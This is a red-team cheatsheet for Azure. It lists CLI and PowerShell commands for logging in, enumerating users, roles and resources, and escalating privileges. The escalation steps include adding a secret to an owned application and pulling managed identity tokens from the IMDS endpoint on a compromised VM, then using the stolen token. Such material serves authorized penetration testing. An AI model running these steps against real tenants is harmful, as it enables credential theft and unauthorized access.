# 💻 Azure Red Team Command-Line Cheatsheet

A quick-reference guide containing all the operational commands extracted from the Azure Study Notes. Use this for rapid copy-pasting during engagements.

---

## 1. Authentication & Login

### Azure CLI (`az`)
```bash
# Basic Interactive Login
az login

# Login via Service Principal
az login --service-principal -u <AppID> -p <Password> --tenant <TenantID>
```

### Azure PowerShell (`Az` Module)
```powershell
# Basic Interactive Login
Connect-AzAccount

# Login via Service Principal
$cred = Get-Credential  # Username = AppID, Password = Secret
Connect-AzAccount -ServicePrincipal -Tenant <TenantID> -Credential $cred

# Login via Access Token
Connect-AzAccount -AccessToken <Token> -AccountId <AccountID>
```

### Microsoft Graph PowerShell (`MgGraph` Module)
```powershell
# Interactive Login with specific permission scopes
Connect-MgGraph -Scopes "Directory.Read.All","User.Read.All"

# App-only Authentication (Certificate)
Connect-MgGraph -ClientId <AppId> -TenantId <TenantId> -CertificateThumbprint <Thumbprint>

# App-only Authentication (Client Secret)
Connect-MgGraph -ClientId <AppId> -TenantId <TenantId> -ClientSecret <SecureString>
```

---

## 2. Entra ID / Microsoft Graph Enumeration

```powershell
# Verify current authenticated context
Get-MgContext

# List all Users
Get-MgUser -All

# Target specific user
Get-MgUser -Filter "startswith(displayName,'auditor')"

# List all Groups
Get-MgGroup -All

# Enumerate all Directory Roles
Get-MgDirectoryRole | ConvertTo-Json

# Find all Global Administrators!
Get-MgDirectoryRoleMember -DirectoryRoleId (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id

# List Members of a specific Role
Get-MgDirectoryRoleMember -DirectoryRoleId <RoleID> -All | ConvertTo-Json

# List Members of a specific Group
Get-MgGroupMember -GroupId <GroupID> | ConvertTo-Json

# Find which groups a user belongs to
Get-MgUserMemberOf -UserId <UserID>
```

---

## 3. Azure Resource Manager (ARM) Enumeration

```bash
# Verify current session context
az account show

# List all Subscriptions the user has access to
az account list --all

# List all Resource Groups
az group list

# List all deployed Resources
az resource list

# List all Role Assignments (who has access to what)
az role assignment list --all

# List available Role Definitions
az role definition list
```

---

## 4. Attack Lifecycle & Escalation Tactics

### Exploiting Applications
```powershell
# Find all applications in the directory
Get-MgApplication -Filter "startswith(displayName,'prod-app')"

# Find applications currently OWNED by the compromised user
Get-MgUserOwnedObject -UserId <UserID> | Where-Object {$_.AdditionalProperties["@odata.type"] -eq "#microsoft.graph.application"}

# Check permissions required by an application
$app = Get-MgApplication -ApplicationId <AppID>
$app.RequiredResourceAccess

# Escalate: Add a new password/secret to an application you own!
Add-MgApplicationPassword -ApplicationId <AppID>
```

### Virtual Machine Exploitation (IMDS)
If you gain RCE on an Azure VM, extract the Managed Identity token using the Instance Metadata Service (IMDS):

```bash
# List available VMs (from outsider perspective)
az vm list

# Get Public/Private IPs of a VM
az vm list-ip-addresses --name <VMName> --resource-group <RG>

# EXFILTRATE ARM TOKEN (Run from inside compromised VM)
curl -H "Metadata:true" "http://[IP_ADDRESS]/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"

# EXFILTRATE GRAPH TOKEN (Run from inside compromised VM)
curl -H "Metadata:true" "http://[IP_ADDRESS]/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://graph.microsoft.com/"
```

Use the stolen token locally:
```powershell
# Authenticate using the stolen IMDS token
$token = "<AccessToken>"
Connect-AzAccount -AccessToken $token -AccountId <SubscriptionID>

# Check what permissions the Managed Identity actually has
Get-AzRoleAssignment -ObjectId <PrincipalID>
```


